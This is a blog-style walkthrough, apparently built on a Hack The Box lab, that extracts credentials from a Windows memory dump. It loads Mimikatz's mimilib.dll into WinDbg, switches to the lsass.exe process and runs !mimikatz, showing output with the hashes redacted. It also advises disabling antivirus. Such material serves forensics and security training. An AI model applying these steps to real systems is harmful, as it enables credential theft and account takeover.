---
title: "Credential Extraction with WinDbg + Mimikatz"
pubDatetime: 2026-09-24T23:00:00Z
draft: false
tags:
  - "WinDbg"
  - "Mimikatz"
  - "LSASS"
  - "Credential Dumping"
  - "Windows Security"
  - "Memory Forensics"
  - "Red Team"
description: "How to extract credentials from a Windows memory dump using WinDbg with the Mimikatz kernel extension, working directly on the context of protected processes."
heroImage: "/assets/images/posts/WinDBG-LSASS/image07.png"
---
## 1. Install WinDbg

The first step is to install WinDbg from the official Microsoft documentation:

> [Install WinDbg - Windows drivers \| Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

![WinDbg download page](/assets/images/posts/WinDBG-LSASS/image01.png)

![WinDbg installer](/assets/images/posts/WinDBG-LSASS/image02.png)

![WinDbg installed](/assets/images/posts/WinDBG-LSASS/image03.png)

Open WinDbg. Before continuing, we need Mimikatz.

## 2. Download Mimikatz

Download it from the official repository by Benjamin Delpy (`gentilkiwi`):

> [Release 2.2.0 20220919 Djoin parser & Citrix SSO Extractor · gentilkiwi/mimikatz · GitHub](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

![Mimikatz release page](/assets/images/posts/WinDBG-LSASS/image04.png)

Download, for example, `mimikatz_trunk.zip`, and extract it.

![Mimikatz extracted](/assets/images/posts/WinDBG-LSASS/image05.png)

> Add a folder exclusion or disable the AV so you can work without it deleting the files.

## 3. Open the dump and load the Mimikatz extension

Open the `.DMP` file with WinDbg. Inside the console, run:

![AV exclusion](/assets/images/posts/WinDBG-LSASS/image06.png)

```
.load C:\Users\iamwin\Documents\x64\mimilib.dll
```

![Loading mimilib.dll in WinDbg](/assets/images/posts/WinDBG-LSASS/image07.png)

## 4. Locate the lsass.exe process

Search for the `lsass.exe` process:

```
!process 0 0 lsass.exe
```

![Finding lsass.exe process](/assets/images/posts/WinDBG-LSASS/image08.png)

## 5. Switch context to the lsass.exe process

```
.process /r /p ffffbc83a93e7080
```

![Switching to lsass.exe context](/assets/images/posts/WinDBG-LSASS/image09.png)

## 6. Run Mimikatz

Now we perform the dump:

```
!mimikatz
```

```
1: kd> !mimikatz

DPAPI Backup keys
=================
Current prefered key:       {00000000-0000-0000-0000-000000000000}
Compatibility prefered key: {00000000-0000-0000-0000-000000000000}

DPAPI System
============
full: <REDACTED>
m/u : <REDACTED> / <REDACTED>

SekurLSA
========

Authentication Id : 0 ; 45311 (00000000:0000b0ff)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      :
Logon Time        : 10/4/2023 10:30:10 AM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : DATACENTER-2019$
	 * Domain   : FREELANCER
	 * NTLM     : <REDACTED>
	 * SHA1     : <REDACTED>
	tspkg : KO
	wdigest :
	 * Username : DATACENTER-2019$
	 * Domain   : FREELANCER
	 * Password : (null)
	kerberos :
	 * Username : DATACENTER-2019$
	 * Domain   : freelancer.htb
	 * Password : <REDACTED>
	 * Key List
	   aes256_hmac       <REDACTED>
	   rc4_hmac_nt       <REDACTED>
	   ...

	ssp :
	masterkey :
	credman :

Authentication Id : 0 ; 429726 (00000000:00068e9e)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : FREELANCER
Logon Server      : DC
Logon Time        : 10/4/2023 10:32:52 AM
SID               : S-1-5-21-3542429192-2036945976-3483670807-500
	msv :
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : FREELANCER
	 * NTLM     : <REDACTED>
	 * SHA1     : <REDACTED>
	 * DPAPI    : <REDACTED>
	tspkg : KO
	wdigest :
	 * Username : Administrator
	 * Domain   : FREELANCER
	 * Password : (null)
	kerberos :
	 * Username : Administrator
	 * Domain   : FREELANCER.HTB
	 * Password : <REDACTED>
	 * Key List
	   aes256_hmac       <REDACTED>
	   aes128_hmac       <REDACTED>
	   rc4_hmac_nt       <REDACTED>
	   ...

	ssp :
	masterkey :
	credman :

[... output truncated — multiple additional entries found for other users and service accounts ...]
```

![Mimikatz output with credentials](/assets/images/posts/WinDBG-LSASS/image10.png)


---

Thanks for reading — I hope this is useful. If you have any questions, corrections, or just want to talk shop, my socials are linked on this blog.

Closing quote:

> *"Our senses allow us to perceive only a small portion of the outside world."*
>
> — Nikola Tesla

